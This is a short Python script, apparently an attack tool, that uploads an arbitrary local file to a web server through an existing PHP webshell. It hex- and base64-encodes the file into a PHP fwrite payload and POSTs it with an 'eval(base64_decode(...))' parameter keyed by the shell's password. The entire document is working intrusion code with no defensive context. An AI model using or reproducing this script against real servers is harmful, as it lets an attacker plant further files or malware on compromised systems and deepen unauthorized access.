import requests
import sys
import binascii
import base64

content = ''
filename = sys.argv[1]
filename_w = sys.argv[2]
url = sys.argv[3]
password = sys.argv[4]
with open(filename,'rb+') as f:
	content = f.read()
content = str(binascii.hexlify(content),'utf-8')
value = f'fwrite(fopen("{filename_w}","wb+"),hex2bin("{content}"));'
value = str(base64.b64encode(value.encode('utf-8')),'utf-8')
data = {password:'eval(base64_decode($_POST[\'x\']));','x':value}
r = requests.post(url=url,data=data)